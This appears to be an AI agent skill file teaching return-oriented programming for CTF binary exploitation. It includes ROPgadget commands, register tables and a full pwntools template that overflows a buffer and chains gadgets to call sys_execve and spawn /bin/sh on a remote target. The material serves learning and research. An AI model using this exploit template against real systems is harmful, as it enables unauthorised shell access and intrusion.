---
name: rop-syscall-exploit
description: Create ROP chains to execute syscalls (like sys_execve) for binary exploitation. Use this skill whenever you're working on binary exploitation challenges, need to build ROP chains for static binaries, want to call syscalls from a buffer overflow, or are dealing with NX-protected binaries where you need to execute /bin/sh. This is essential for CTF challenges, security research, and understanding return-oriented programming with syscall invocation.
---

# ROP Syscall Exploitation

This skill helps you create Return-Oriented Programming (ROP) chains that invoke syscalls, typically `sys_execve` to spawn a shell. This technique is essential for exploiting static binaries or NX-protected binaries where you can't execute shellcode directly.

## When to Use This Skill

Use this skill when:
- You have a buffer overflow vulnerability in a static binary
- You need to call `sys_execve` to spawn `/bin/sh`
- You're working on CTF challenges with NX protection
- You need to build ROP chains for syscall invocation
- You're analyzing binaries for exploitation potential

## Core Concept

The goal is to prepare registers for a syscall and then execute it. For `sys_execve` (syscall number 59 on x86-64), you need:

| Register | Value | Purpose |
|----------|-------|----------|
| `rax` | `0x3b` (59) | Syscall number for `sys_execve` |
| `rdi` | ptr to "/bin/sh" | Path to executable |
| `rsi` | `0` | No arguments |
| `rdx` | `0` | No environment variables |

## Step-by-Step Exploitation Process

### 1. Find Register Gadgets

Use ROPgadget to find pop instructions for each register:

```bash
ROPgadget --binary <binary> | grep -E "pop (rdi|rsi|rdx|rax) ; ret"
```

You need gadgets for all four registers. Example output:
```
0x0000000000415664 : pop rax ; ret
0x0000000000400686 : pop rdi ; ret
0x00000000004101f3 : pop rsi ; ret
0x00000000004498b5 : pop rdx ; ret
```

### 2. Find Writable Memory

You need a writable location to store the "/bin/sh" string. Use GEF/pwndbg:

```bash
gef> vmmap
```

Look for `rw-` sections. Common locations:
- `.data` or `.bss` sections
- Heap memory
- Global Offset Table (GOT) area

### 3. Find Write Gadgets

To write "/bin/sh" to memory, find a write gadget:

```bash
ROPgadget --binary <binary> | grep "mov qword ptr \["
```

Look for patterns like:
- `mov qword ptr [rax], rdx ; ret` - Write rdx to address in rax
- `mov qword ptr [rdi], rax ; ret` - Write rax to address in rdi

### 4. Find Syscall Instruction

```bash
ROPgadget --binary <binary> | grep "syscall ; ret"
```

Or just `syscall` if you don't need to return.

### 5. Build the ROP Chain

The chain has two phases:

**Phase 1: Write "/bin/sh" to memory**
```
1. pop rdx, "/bin/sh\x00"  # Load string into rdx
2. pop rax, <writable_addr> # Load target address into rax
3. mov qword ptr [rax], rdx # Write string to memory
```

**Phase 2: Prepare registers and call syscall**
```
1. pop rax, 0x3b           # sys_execve number
2. pop rdi, <bin_sh_addr>  # Pointer to "/bin/sh"
3. pop rsi, 0              # No arguments
4. pop rdx, 0              # No environment
5. syscall                 # Execute!
```

## Complete Exploit Template

```python
from pwn import *

# === CONFIGURATION ===
binary_name = './vulnerable_binary'
elf = ELF(binary_name)

# === GADGET ADDRESSES ===
# Find these with: ROPgadget --binary <binary> | grep -E "pop (rdi|rsi|rdx|rax) ; ret"
pop_rax = p64(0xXXXXXXXX)  # pop rax ; ret
pop_rdi = p64(0xXXXXXXXX)  # pop rdi ; ret
pop_rsi = p64(0xXXXXXXXX)  # pop rsi ; ret
pop_rdx = p64(0xXXXXXXXX)  # pop rdx ; ret

# Find with: ROPgadget --binary <binary> | grep "mov qword ptr \["
write_gadget = p64(0xXXXXXXXX)  # mov qword ptr [rax], rdx ; ret

# Find with: ROPgadget --binary <binary> | grep "syscall"
syscall_addr = p64(0xXXXXXXXX)  # syscall ; ret

# === MEMORY ADDRESSES ===
# Find writable memory with: vmmap in GEF/pwndbg
writable_addr = 0xXXXXXXXX  # Address in rw- section

# === BUILD ROP CHAIN ===
rop = ROP(elf)

# Phase 1: Write "/bin/sh" to writable memory
rop.raw(pop_rdx)
rop.raw(b'/bin/sh\x00')
rop.raw(pop_rax)
rop.raw(p64(writable_addr))
rop.raw(write_gadget)

# Phase 2: Set up syscall registers
rop.raw(pop_rax)
rop.raw(p64(0x3b))  # sys_execve

rop.raw(pop_rdi)
rop.raw(p64(writable_addr))  # ptr to "/bin/sh"

rop.raw(pop_rsi)
rop.raw(p64(0))  # NULL

rop.raw(pop_rdx)
rop.raw(p64(0))  # NULL

rop.raw(syscall_addr)

# === CREATE PAYLOAD ===
# Adjust offset based on your vulnerability
offset = 0x408  # Distance to saved return address
payload = b'A' * offset + rop.chain()

# === EXPLOIT ===
if 'gdb' in args:
    p = process(binary_name)
    gdb.attach(p, gdbscript='break *0x400bad')
else:
    p = remote('target', port)

p.sendline(payload)
p.interactive()
```

## 32-bit Variant

For 32-bit binaries, the syscall numbers and registers differ:

| Register | Value | Purpose |
|----------|-------|----------|
| `eax` | `0xb` (11) | Syscall number for `execve` |
| `ebx` | ptr to "/bin/sh" | Path to executable |
| `ecx` | `0` | No arguments |
| `edx` | `0` | No environment variables |

The ROP chain structure is similar but uses 32-bit registers and addresses.

## Alternative: SROP

If you're lacking gadgets to write "/bin/sh" to memory, consider **SROP (Sigreturn-Oriented Programming)**. SROP allows you to control all register values (including RIP) from the stack by crafting a fake sigreturn frame.

## Common Issues & Solutions

### Issue: Can't find write gadget
**Solution**: Try SROP instead, or look for alternative write patterns like `mov [rdi], rax`.

### Issue: Writable memory not accessible
**Solution**: Check if the address is in a valid rw- section. Use `vmmap` to verify permissions.

### Issue: Syscall fails with wrong error
**Solution**: Verify register values with GDB. Check that:
- `rax` contains the correct syscall number
- `rdi` points to a valid "/bin/sh" string
- The string is null-terminated

### Issue: Segmentation fault
**Solution**: Check that all gadget addresses are valid and the ROP chain doesn't overflow into invalid memory.

## Debugging Tips

1. **Use GDB with GEF/pwndbg** to inspect register values before syscall
2. **Set breakpoints** at key points in your ROP chain
3. **Check memory** to verify "/bin/sh" was written correctly:
   ```bash
   gef> x/8xb 0xXXXXXXXX
   ```
4. **Verify syscall number** matches your architecture (59 for x86-64, 11 for x86-32)

## Quick Reference

### Syscall Numbers
- x86-64: `sys_execve` = 59 (0x3b)
- x86-32: `execve` = 11 (0xb)

### Essential Commands
```bash
# Find pop gadgets
ROPgadget --binary <binary> | grep -E "pop (rdi|rsi|rdx|rax) ; ret"

# Find write gadgets
ROPgadget --binary <binary> | grep "mov qword ptr \["

# Find syscall
ROPgadget --binary <binary> | grep "syscall"

# Auto-generate ROP chain (if available)
ROPgadget --binary <binary> --ropchain
```

### Register Setup for sys_execve
```
rax = 0x3b          # syscall number
rdi = ptr_to_bin_sh # "/bin/sh" string address
rsi = 0             # NULL (no args)
rdx = 0             # NULL (no env)
```

## Related Techniques

- **Ret2lib**: Call existing library functions instead of syscalls
- **Ret2shellcode**: Execute shellcode directly (requires executable memory)
- **SROP**: Sigreturn-Oriented Programming for register control
- **ROP**: General Return-Oriented Programming for arbitrary code execution
